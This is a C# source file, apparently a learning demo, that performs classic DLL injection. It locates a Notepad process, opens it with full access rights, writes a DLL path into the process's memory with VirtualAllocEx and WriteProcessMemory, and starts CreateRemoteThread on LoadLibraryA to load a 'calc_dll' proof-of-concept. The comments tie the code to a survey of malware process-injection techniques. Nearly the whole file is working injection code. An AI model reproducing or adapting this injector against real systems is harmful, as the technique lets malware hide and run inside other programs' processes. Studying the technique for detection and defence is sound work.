using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;



namespace dll_injection_demo_csharp
{
    class Program
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        // The DLLImport attribute tells the runtime that it should load the unmanaged DLL. The string passed in is the DLL our target function is in
        // Sometimes you may specify CharSet= which specifies which character set is used for marshalling strings. SetLastError says that the runtime
        // should capture that error code so the user can retrieve it via Marshal.GetLastWin32Error()
        [DllImport("kernel32.dll", SetLastError = true)]
        // This defines the managed method that has the exact same signature as the unmanaged one. The declaracterion has the extern keyword, which
        // tells the runtime this is an external method and that when invoked it can be found in the DLL specified in the DllImport attribute above.
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsWow64Process2(
            IntPtr process,
            out ushort processMachine,
            out ushort nativeMachine
        );

        // privileges
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        // used for memory allocation
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;

        public static bool is64Bit(Process process)
        {
            bool ret;
            ushort processMachine;
            ushort nativeMachine;
            IsWow64Process2(process.Handle, out processMachine, out nativeMachine);

            if(processMachine == 0)
            {
                // 64 bit application
                Console.WriteLine("Target process was 64-bit");
                return true;
            }

            return false;
        }

        static void Main(string[] args)
        {
            // Classic DLL Injection
            // Technique #1 from https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process 

            //TODO Use traditional malware Win API calls to find pid
            // CreateToolhelp32Snapshot
            // Process32First - retrieves information about the first process in the snapshot
            // Process32Next - use this in a loop to iterate through them

            //TODO Command line args for target process and DLL path

            // Name of the process we want to inject into
            string targetProcess = "notepad";
            // Path of the dll we want to inject
            string dllName = "C:\\Users\\andy\\source\\repos\\calc_dll\\Debug\\calc_dll.dll";

            // Return an array of 
            Console.WriteLine("Attempting to find target process with the following name: " + targetProcess);
            Process[] localByName = Process.GetProcessesByName(targetProcess);

            if(is64Bit(localByName[0]))
            {
                Console.WriteLine("Can't inject a 32-bit DLL into a 64-bit process. Exiting.");
                System.Environment.Exit(1);
            }

            Console.WriteLine("Found process with PID: " + localByName[0].Id);
            // OpenProcess - to grab handle to the target process
            IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, localByName[0].Id);
            // searching for the address of LoadLibraryA and storing it in a pointer
            // GetModuleHandle - returns the baseaddress of kernel32.dll
            // GetProcAddress - determine the address of LoadLibrary
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            // alocating some memory on the target process - enough to store the name of the dll
            // and storing its address in a pointer
            IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // WriteProcessMemory to write the path in the allocated memory
            // writing the name of the dll there
            UIntPtr bytesWritten;
            WriteProcessMemory(hProcess, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

            // CreateRemoteThread, NtCreateThreadEx, or RtlCreateUserThread to execute the code
            // Creates a thread in the target process, which will execute LoadLibraryA with an arg of allocMemAddress (location where we stored our DLL string)
            // creating a thread that will call LoadLibraryA with allocMemAddress as argument
            // loadLibraryAddr = Pointer to the application-defined function to be executed by the thread and represents the starting address of the thread in the remote process
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);

            Console.ReadLine();
        }
    }
}
